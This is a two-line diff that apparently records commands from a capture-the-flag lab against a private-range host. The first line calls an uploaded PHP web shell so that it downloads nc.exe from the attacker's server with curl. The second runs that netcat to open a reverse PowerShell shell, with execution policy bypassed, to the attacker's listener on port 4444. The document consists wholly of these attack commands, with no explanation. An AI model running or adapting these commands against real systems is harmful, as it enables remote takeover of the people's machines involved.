@@ -1,0 +1,2 @@
+http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl%20-O%2010.10.14.133:8000/_nc.exe
+_nc.exe 10.10.14.133 4444 -e "powershell -nop -exec bypass"
